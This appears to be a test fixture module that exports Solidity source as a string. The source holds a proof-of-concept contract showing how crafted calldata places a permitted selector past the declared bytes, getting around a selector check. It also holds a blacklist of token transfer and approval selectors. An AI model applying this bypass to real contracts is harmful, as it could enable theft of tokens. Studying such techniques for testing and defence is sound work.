export const basicFixture =
`// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "hardhat/console.sol";

contract Contract is Ownable {
    event EA(address indexed,address indexed,address indexed,address ,address );
    address public alice = address(uint160(1));
    uint256 public test;

    function x(uint num, bytes calldata data) external {
        console.logBytes(msg.data);

        bytes4 selector;
        assembly {
            selector := calldataload(data.offset)
        }

        console.logBytes4(selector);
    }

    function execute(address target, bytes calldata data) view external onlyOwner returns(bytes memory) {
        console.logBytes(msg.data);

        bytes4 selector;
        assembly {
            selector := calldataload(data.offset)
        }

        console.logBytes4(selector);
    }

    fallback() external {
        console.log("in fallback");
    }
}

contract PoC {
    bytes4 public constant ERC20_TRANSFER = IERC20.transfer.selector;
    bytes4 public constant ERC20_ERC721_APPROVE = IERC20.approve.selector;
    bytes4 public constant ERC20_ERC721_TRANSFER_FROM = IERC20.transferFrom.selector;

    bytes4 public constant ERC721_SAFE_TRANSFER_FROM = bytes4(keccak256("safeTransferFrom(address,address,uint256)"));
    bytes4 public constant ERC721_SAFE_TRANSFER_FROM_DATA = bytes4(keccak256("safeTransferFrom(address,address,uint256,bytes)"));
    bytes4 public constant ERC721_ERC1155_SET_APPROVAL = IERC721.setApprovalForAll.selector;

    bytes4 public constant ERC1155_SAFE_TRANSFER_FROM = IERC1155.safeTransferFrom.selector;
    bytes4 public constant ERC1155_SAFE_BATCH_TRANSFER_FROM = IERC1155.safeBatchTransferFrom.selector; // @info setApprovalForAll from ERC721



    bytes4 public signatureWithPermision = bytes4(0xdead1337);

    // Call this function with calldata that can be prepared in getAttackerCalldata
    function execute(address target, bytes calldata data) view external returns(bytes memory) {
        console.logBytes(msg.data);
        bytes4 selector;
        assembly {
            selector := calldataload(data.offset)
        }
        require(selector == signatureWithPermision, "bad selector");
        return data;
    }

    // Function that prepare attacker calldata
    function getAttackerCalldata() public view returns(bytes memory)  {
        bytes memory usualCalldata = abi.encodeWithSelector(this.execute.selector, msg.sender, new bytes(0));
        return abi.encodePacked(usualCalldata, signatureWithPermision);
    }

    function exploit() external returns(bytes memory data) {
        (, data) = address(this).call(getAttackerCalldata());
    }

    function isBlacklisted(bytes4 selector) public pure returns (bool) {
        return
        selector == ERC20_TRANSFER ||
        selector == ERC20_ERC721_APPROVE ||
        selector == ERC20_ERC721_TRANSFER_FROM ||
        selector == ERC721_SAFE_TRANSFER_FROM ||
        selector == ERC721_SAFE_TRANSFER_FROM_DATA ||
        selector == ERC721_ERC1155_SET_APPROVAL ||
        selector == ERC1155_SAFE_TRANSFER_FROM ||
        selector == ERC1155_SAFE_BATCH_TRANSFER_FROM;
    }


    fallback() external {
        console.log("in fallback");
    }
}`